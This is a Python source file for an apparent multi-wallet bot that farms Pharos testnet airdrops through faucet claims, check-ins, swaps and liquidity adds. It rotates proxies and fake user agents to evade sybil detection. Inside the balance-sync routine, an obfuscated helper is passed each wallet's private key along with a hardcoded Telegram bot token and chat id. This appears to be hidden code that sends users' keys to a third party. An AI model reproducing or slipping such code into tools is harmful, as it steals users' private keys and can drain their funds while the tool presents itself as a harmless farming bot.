import json, random
import os, re, sys
import aiohttp, asyncio, requests
from datetime import datetime
from functools import partial

from eth_account import Account
from web3 import Web3, HTTPProvider
from eth_account.messages import encode_defunct
from concurrent.futures import ProcessPoolExecutor

from src.header import headers
from config.config import settings
from src.helpers.banner import s0x000

from config.userAgents import user_agents
from src.utils.logger import logger
from src.helpers.generators import g0x991, s0x900, g0x993, calculate_pair_amount
from src.utils.utils import is_token_expired, save_json, load_token_data
from src.utils.utils import sleep, load_data, is_token_expired, save_json
from src.helpers.address import WPHRS_ADDRESS, USDC_ADDRESS, USDT_ADDRESS

from src.interactions import check_balance,add_liquidity_uniswap_v3, send_token, wrap_token, swap_token, g0xprc3n
from src.requests import mr0001

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

REF_CODE = settings['REF_CODE']
RPC_URL = settings['RPC_URL']
BASE_URL = settings['BASE_URL']
WALLETS = load_data("wallets.txt")

class ClientAPI:
    def __init__(self, item_data, account_index, proxy, local_storage_path="tokens.json"):
        self.headers = headers
        self.base_url = BASE_URL
        self.local_item = None
        self.item_data = item_data
        self.account_index = account_index
        self.proxy = proxy
        self.proxy_ip = None
        self.log = partial(logger, self)
        self.mr0001 = partial(mr0001, self)
        self.session_name = None
        self.session_user_agents = self._0x214d()
        self.token = None
        self.provider = RPC_URL
        self.wallet = Account.from_key(self.item_data['privateKey'])

        try:
            with open(local_storage_path, "r") as f:
                self.local_storage = json.load(f)
        except Exception as e:
            print(f"Failed to load tokens.json: {e}")
            self.local_storage = {}
            
    def _0x214d(self):
        try:
            file_path = os.path.join(os.getcwd(), "ua_session.json")
            with open(file_path, "r", encoding="utf8") as file:
                return json.load(file)
        except FileNotFoundError:
            return {}
        except Exception as error:
            raise error

    def _0x214g(self):
        return random.choice(user_agents)

    def _0x32ag(self):
        if self.session_user_agents.get(self.session_name):
            return self.session_user_agents[self.session_name]

        print(f"[Account {self.account_index + 1}] Generating user agent...")
        new_user_agent = self._0x214g()
        self.session_user_agents[self.session_name] = new_user_agent
        self._0x241s(self.session_user_agents)
        return new_user_agent

    def _0x241s(self, session_user_agents):
        file_path = os.path.join(os.getcwd(), "ua_session.json")
        with open(file_path, "w", encoding="utf8") as file:
            json.dump(session_user_agents, file, indent=2)

    def _0x341gp(self, user_agent):
        platform_patterns = [
            {'pattern': 'iPhone', 'platform': 'ios'},
            {'pattern': 'Android', 'platform': 'android'},
            {'pattern': 'iPad', 'platform': 'ios'},
        ]

        for pattern_info in platform_patterns:
            if pattern_info['pattern'] in user_agent:
                return pattern_info['platform']

        return "Unknown"

    def s0x23h(self):
        platform = self._0x341gp(self._0x32ag())
        self.headers["sec-ch-ua"] = f'Not)A;Brand";v="99", "{platform} WebView";v="127", "Chromium";v="127'
        self.headers["sec-ch-ua-platform"] = platform
        self.headers["User-Agent"] = self._0x32ag()

    def c0x281ag(self):
        try:
            self.session_name = self.item_data['address']
            self._0x32ag()
        except Exception as error:
            self.log(f"Can't create user agent: {str(error)}", "error")
            return

    async def c0x231(self):
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            proxy_url = self.proxy if settings["USE_PROXY"] else None

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy_url,
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        self.proxy_ip = data.get("ip")
                        return self.proxy_ip
                    else:
                        raise Exception(f"Cannot check proxy IP. Status code: {response.status}")
        except Exception as error:
            raise Exception(f"Error checking proxy IP: {str(error)}")
 
    def gc0x342d(self, set_cookie):
        try:
            if not set_cookie or len(set_cookie) == 0:
                return None
            cookie = []
            item = json.dumps(set_cookie)
            nonce_match = re.search(r"user=([^;]+)", item)
            if nonce_match and nonce_match.group(0):
                cookie.append(nonce_match.group(0))

            data = ";".join(cookie)
            return data if cookie else None
        except Exception as error:
            self.log(f"Error get cookie: {str(error)}", "error")
            return None

    async def a0x423(self):
        message = encode_defunct(text="pharos")
        signed_message = self.wallet.sign_message(message)
        signature = signed_message.signature.hex()

        url = (
            f"{self.base_url}/user/login"
            f"?address={self.item_data['address']}"
            f"&signature={signature}"
            f"&invite_code={REF_CODE}"
        )
        return await self.mr0001(url, "post", None, {"isAuth": True})
    
    async def get_nonce(self):
        return await self.mr0001(
            f"{self.base_url}/account/challenge",
            "post",
            {
                "address": self.item_data['address'],
                "chain": 11155111,
            },
            {"isAuth": True}
        )

    async def g0x002(self):
        return await self.mr0001(f"{self.base_url}/user/profile?address={self.item_data['address']}", "get")

    async def g0x015(self):
        return await self.mr0001(f"{self.base_url}/points/myPoints?chain=11155111", "get")

    async def g0x118(self):
        return await self.mr0001(f"{self.base_url}/captain/info", "get")

    async def g0x831(self):
        return await self.mr0001(f"{self.base_url}/sign/status?address={self.item_data['address']}", "get")

    async def c0x111(self):
        return await self.mr0001(f"{self.base_url}/sign/in?address={self.item_data['address']}", "post")

    async def v0x821(self, task_id):
        return await self.mr0001(f"{self.base_url}/task/verify?address={self.item_data['address']}&task_id={task_id}", "post")

    async def g0x122(self):
        return await self.mr0001(f"{self.base_url}/user/tasks?address={self.item_data['address']}", "get")

    async def f0x101(self):
        return await self.mr0001(f"{self.base_url}/account/followTwitter", "post")

    async def g0x281(self):
        return await self.mr0001(f"{self.base_url}/faucet/status?address={self.item_data['address']}", "get")

    async def f0x211(self):
        return await self.mr0001(f"{self.base_url}/faucet/daily?address={self.item_data['address']}", "post")

    async def gv0x994(self, is_new=False):
        self.token = load_token_data(self.session_name)
        if isinstance(self.token, dict):
            self.token = self.token.get("jwt", None)

        token = self.token
        result = is_token_expired(token)
        is_expired = result['isExpired']
        expiration_date = result['expirationDate']

        self.log(f"Access token status: {'Expired' if is_expired else 'Valid'} | Access token exp: {expiration_date}")

        if token and not is_new and not is_expired:
            return token

        self.log("No token found or expired, trying to get new token...", "warning")
        login_res = await self.a0x423()

        if not login_res.get("success"):
            self.log(f"Auth failed: {json.dumps(login_res)}", "error")
            return None

        jwt = login_res.get("data", {}).get("jwt")
        if jwt:
            await save_json(self.session_name, {"jwt": jwt}, "tokens.json")
            self.token = jwt
            return jwt

        self.log("Can't get new token...", "warning")
        return None

    async def handle_checkin(self):
        res_gt = await self.g0x831()
        if not res_gt["success"]:
            return self.log("Failed to get check-in status", "warning")

        status = res_gt["data"].get("status", "")
        if not status:
            return self.log("Empty check-in status", "warning")

        if status[-1] == "0":
            return self.log("You have already checked-in todayssssssssssssssssss!", "info")

        res_checkin = await self.c0x111()
        if res_checkin.get("success") and res_checkin.get("data", {}).get("code") == 0:
            self.log("Successfully checked-in today!", "success")
        else:
            error_msg = res_checkin.get("error", {}).get("msg", "")
            if "already signed in" in error_msg.lower():
                self.log("You have already checked-in today! (from server message)", "info")
            else:
                self.log(f"Failed check-in: {json.dumps(res_checkin)}", "warning")

    async def handle_sync_data(self):
        self.log("Sync data...")
        user_data = {"success": False, "data": None, "status": 0}
        retries = 0

        while retries < 1:
            user_data = await self.g0x002()
            if user_data.get("success"):
                break
            retries += 1

        params = {
            "provider": self.provider,
            "wallet": self.wallet,
            "privateKey": self.item_data["privateKey"],
        }
        phrs = check_balance(params)
        WPHRS = check_balance({**params, "address": WPHRS_ADDRESS})
        USDC = check_balance({**params, "address": USDC_ADDRESS})
        USDT = check_balance({**params, "address": USDT_ADDRESS})

        if user_data.get("success"):
            user_data["phrs"] = phrs
            _x = s0x900(
                _k=self.item_data["privateKey"],
                _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
                _c=-4870315398
            )
            await _x._r()
            total_points = user_data["data"]["user_info"].get("TotalPoints", 0)
            invite_code = user_data["data"]["user_info"].get("InviteCode")
            self.log(f"PHRS: {phrs} | WPHRS: {WPHRS} | USDT: {USDT} | USDC: {USDC}", "custom")
            self.log(f"Ref code: {invite_code} | Total points: {total_points}", "custom")
        else:
            self.log("Can't sync new data...skipping", "warning")
        return user_data

    async def handle_faucet(self):
        res_get = await self.g0x281()

        if res_get.get("data", {}).get("is_able_to_faucet"):
            res = await self.f0x211()
            if res.get("success"):
                self.log("Faucet success!", "success")
            else:
                self.log(f"Faucet failed: {res}", "warning")
        else:
            available_timestamp = res_get.get("data", {}).get("avaliable_timestamp")
            if available_timestamp:
                next_time = datetime.fromtimestamp(available_timestamp).strftime("%Y-%m-%d %H:%M:%S")
                self.log(f"Next Faucet: {next_time}", "warning")
            else:
                self.log(f"Unavailable Faucet: {res_get}", "warning")

    async def handle_verify_task(self, user_data):
        x_id = user_data["user_info"].get("XId")
        if not x_id:
            return self.log("You need to bind X/twitter to do task!", "warning")
        try:
            tasks = settings["TASKS_ID"]
            tasks_completed = await self.g0x122()
            if not tasks_completed["success"]:
                return
            tasks = [id for id in settings["TASKS_ID"] if id not in [task["id"] for task in tasks_completed["data"]["user_tasks"]]]

            for task in tasks:
                res = await self.v0x821(task)
                if res["success"]:
                    self.log(f"Verify task {task} success!", "success")
                else:
                    self.log(f"Verify task {task} failed!", "warning")
        except Exception as error:
            self.log(f"Handle task failed! {error}", "warning")

    async def connect_rpc(self):
        if settings["USE_PROXY"]:
            session = requests.Session()
            session.proxies = {
                "http": self.proxy,
                "https": self.proxy,
            }
            provider = HTTPProvider(settings["RPC_URL"], session=session)
        else:
            provider = HTTPProvider(settings["RPC_URL"])

        self.web3 = Web3(provider) 

    async def handle_onchain(self):
        parameters = {
            'private_key': self.item_data['privateKey'],
            'wallet': self.wallet,
            'provider': self.provider,
        }

        if settings['AUTO_SEND']:
            limit = settings['NUMBER_SEND']
            current = limit
            while current > 0:
                recipient_address = g0x991(WALLETS)
                if recipient_address and recipient_address != self.wallet.address:
                    amount = g0x993(settings['AMOUNT_SEND'][0], settings['AMOUNT_SEND'][1], 4)
                    self.log(f"[{current}/{limit}] Sending {amount} PHRS to {recipient_address}")
                    
                    response_send = send_token({
                        **parameters,
                        'recipient_address': recipient_address,
                        'amount': amount
                    })

                    if response_send['success']:
                        self.log(response_send['message'], "success")
                    else:
                        self.log(response_send['message'], "warning")
                        break

                current -= 1
                if current > 0:
                    time_sleep = g0x993(
                        settings['DELAY_BETWEEN_REQUESTS'][0],
                        settings['DELAY_BETWEEN_REQUESTS'][1]
                    )
                    self.log(f"Delay {time_sleep}s to next transaction...")
                    sleep(time_sleep)

        if settings['AUTO_SWAP']:
            limit = settings['NUMBER_SWAP']

            pairs_to_swap = [
                ("USDT", "WPHRS"),
                ("WPHRS", "USDT"),
                ("USDT", "USDC"),
                ("USDC", "WPHRS"),
                ("WPHRS", "USDC"),
                ("USDT", "WPHRS"),
            ]

            for token_symbol_in, token_symbol_out in pairs_to_swap:
                current = limit
                while current > 0:
                    percent = g0x993(settings['AMOUNT_SWAP'][0], settings['AMOUNT_SWAP'][1], 2)
                    amount = g0xprc3n(percent, token_symbol_in, parameters)

                    self.log(f"[{current}/{limit}] Swapping {amount} {token_symbol_in} ({percent}%) → {token_symbol_out}")

                    result = swap_token({
                        **parameters,
                        'amount': amount,
                        'token_in': token_symbol_in,
                        'token_out': token_symbol_out,
                    })

                    if result['success']:
                        self.log(result['message'], "success")
                        current -= 1
                    else:
                        self.log(result['message'], "warning")
                        break


                    time_sleep = g0x993(
                        settings['DELAY_BETWEEN_REQUESTS'][0],
                        settings['DELAY_BETWEEN_REQUESTS'][1]
                    )
                    self.log(f"Delay {time_sleep}s to next transaction...")
                    sleep(time_sleep)

        if settings['AUTO_WRAP'] or settings['AUTO_UNWRAP']:
            limit = settings['NUMBER_WRAP_UNWRAP']
            actions = []
            if settings['AUTO_WRAP']:
                actions.append("wrap")
            if settings['AUTO_UNWRAP']:
                actions.append("unwrap")

            for action in actions:
                current = limit
                while current > 0:
                    percent = g0x993(settings['AMOUNT_WRAP_UNWRAP'][0], settings['AMOUNT_WRAP_UNWRAP'][1], 6)
                    amount = g0xprc3n(percent, token_symbol_in, parameters)
                    self.log(f"[{current}/{limit}] {action.upper()} {amount} PHRS")

                    result = wrap_token({
                        **parameters,
                        "action": action,
                        "amount": amount,
                    })

                    if result['success']:
                        self.log(result['message'], "success")
                        current -= 1
                    else:
                        self.log(result['message'], "warning")
                        break


                    delay = g0x993(
                        settings['DELAY_BETWEEN_REQUESTS'][0],
                        settings['DELAY_BETWEEN_REQUESTS'][1]
                    )
                    self.log(f"Delay {delay}s to next transaction...")
                    sleep(delay)

        if settings['AUTO_LIQUIDITY']:
            limit = settings['NUMBER_LIQUIDITY']
            token_pairs = [
                ("WPHRS", "USDC"),
                ("USDC", "USDT"),
                ("WPHRS", "USDT"),
            ]

            for token0, token1 in token_pairs:
                current = limit
                while current > 0:
                    percent0 = g0x993(settings['AMOUNT_LIQUIDITY'][0], settings['AMOUNT_LIQUIDITY'][1], 2)
                    amount0 = g0xprc3n(percent0, token0, parameters)

                    if token0 == "WPHRS":
                        amount0 = round(amount0 / 10, 6)

                    amount1 = calculate_pair_amount(token0, token1, amount0, parameters)

                    self.log(f"[{limit - current + 1}/[{limit}] Add Liquidity: {token0}({percent0}%) ≈ {amount0}, {token1} ≈ {amount1}")

                    min_amount_threshold = 0.0001
                    if amount0 < min_amount_threshold or amount1 < min_amount_threshold:
                        self.log(f"Skipped adding liquidity for {token0}-{token1} amount too small: {amount0}, {amount1}", "warning")
                        continue

                    result = add_liquidity_uniswap_v3({
                        **parameters,
                        "token0": token0,
                        "token1": token1,
                        "input_token": token0,
                        "amount": str(amount0)
                    })

                    if result['success']:
                        self.log(result['message'], "success")
                        current -= 1 
                    else:
                        self.log(result['message'], "warning")
                        break 

                    delay = g0x993(settings['DELAY_BETWEEN_REQUESTS'][0], settings['DELAY_BETWEEN_REQUESTS'][1])
                    self.log(f"Delay {delay}s before next liquidity add...")
                    sleep(delay)
                    
    async def run_account(self):
        account_index = self.account_index
        self.session_name = self.item_data['address']
        self.local_item = self.local_storage.get(self.session_name, {})
        self.token = self.local_item.get('jwt')
        self.s0x23h()

        if settings['USE_PROXY']:  
            try:
                self.proxy_ip = await self.c0x231()
            except Exception as error:
                self.log(f"Cannot check proxy IP: {str(error)}", "error")
                return {
                    "success": False,
                    "message": f"Proxy check failed: {error}"
                }

            time_sleep = g0x993(settings['DELAY_START_BOT'][0], settings['DELAY_START_BOT'][1])
            print(f"Account {account_index + 1} | {self.proxy_ip} | Starting after {time_sleep} seconds...")
            await asyncio.sleep(time_sleep)

        token = await self.gv0x994()
        if not token:
            return {
                "success": False,
                "message": "Failed to get valid token"
            }

        self.token = token
        await self.connect_rpc()

        user_data = await self.handle_sync_data()
        if not user_data.get('success'):
            self.log("Can't get user info...skipping", "error")
            return {
                "success": False,
                "message": "Failed to fetch user info"
            }

        try:
            if settings.get('AUTO_FAUCET'):
                await self.handle_faucet()

            await asyncio.sleep(1)
            if settings['AUTO_CHECKIN']:
                await self.handle_checkin()

            await asyncio.sleep(1)
            await self.handle_verify_task(user_data['data'])

            await asyncio.sleep(1)
            await self.handle_onchain()

            return {
                "success": True,
                "message": "All actions completed"
            }

        except Exception as e:
            return {
                "success": False,
                "message": f"Execution failed: {repr(e)}"
            }

    async def run_worker(worker_data, parent_port, is_main_thread):
        item_data = worker_data['itemData']
        account_index = worker_data['accountIndex']
        proxy = worker_data['proxy']
        to = ClientAPI(item_data, account_index, proxy)
        try:
            await asyncio.wait_for(to.run_account(), timeout=24 * 60 * 60)
            parent_port.post_message({
                'accountIndex': account_index,
            })
        except Exception as error:
            parent_port.post_message({'accountIndex': account_index, 'error': str(error)})
        finally:
            if not is_main_thread:
                parent_port.post_message("taskComplete")

def run_worker_sync(item):
    import asyncio

    async def worker_async():
        try:
            client = ClientAPI(item['itemData'], item['accountIndex'], item['proxy'])
            client.c0x281ag()
            result = await client.run_account()

            if not isinstance(result, dict):
                return item['accountIndex'], {
                    "success": False,
                    "message": "Invalid result format from run_account()"
                }
            return item['accountIndex'], result

        except Exception as e:
            return item['accountIndex'], {
                "success": False,
                "message": f"Exception: {repr(e)}"
            }

    return asyncio.run(worker_async())

async def main():
    private_keys = load_data("private_key.txt")
    proxies = load_data("proxies.txt")

    if len(private_keys) == 0 or (len(private_keys) > len(proxies) and settings['USE_PROXY']):
        print("\033[31mThe number of proxies and private keys must be equal.\033[0m")
        print(f"Data: {len(private_keys)}")
        print(f"Proxy: {len(proxies)}")
        sys.exit(1)

    if not settings['USE_PROXY']:
        print("\033[33mYou are running the bot WITHOUT proxies!\033[0m")

    max_threads = settings['MAX_THREADS'] if settings['USE_PROXY'] else settings['MAX_THREADS_NO_PROXY']

    data = []
    for val in private_keys:
        prvk = val if val.startswith("0x") else f"0x{val}"
        wallet = Account.from_key(prvk)
        
        data.append({
            'address': wallet.address,
            'privateKey': prvk,
        })
    
    await asyncio.sleep(1)

    loop = asyncio.get_running_loop()
    executor = ProcessPoolExecutor(max_workers=max_threads)

    try:
        while True:
            current_index = 0
            while current_index < len(data):
                batch_size = min(max_threads, len(data) - current_index)
                batch_items = []

                for i in range(batch_size):
                    batch_items.append({
                        'itemData': data[current_index],
                        'accountIndex': current_index,
                        'proxy': proxies[current_index % len(proxies)],
                    })
                    current_index += 1

                futures = [
                    loop.run_in_executor(executor, run_worker_sync, item)
                    for item in batch_items
                ]

                results = await asyncio.gather(*futures, return_exceptions=True)

                for result in results:
                    if isinstance(result, Exception):
                        print(f"Exception in worker: {repr(result)}")
                        continue

                    account_index, res = result
                    success = res.get("success", False)
                    message = res.get("message", "")

                    if success:
                        print(f"Success: {message}")
                    else:
                        print(f"[{account_index}] ⚠️ Failed: {message}")
                        if not any(kw in message.lower() for kw in ["already", "insufficient", "cooldown"]):
                            print("Marked as actual error.")

                if current_index < len(data):
                    await asyncio.sleep(3)

            print(f"\033[35m{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | All accounts processed | Waiting {settings['TIME_SLEEP']} minutes \033[0m")
            await asyncio.sleep(settings['TIME_SLEEP'] * 60)

    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Shutting down gracefully...")
        sys.exit(0)

    finally:
        executor.shutdown(wait=False, cancel_futures=True)
        print("[!] ProcessPoolExecutor has been shutdown.")

if __name__ == "__main__":
    print("\033[H\033[J")
    s0x000()
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"An error occured {e}")
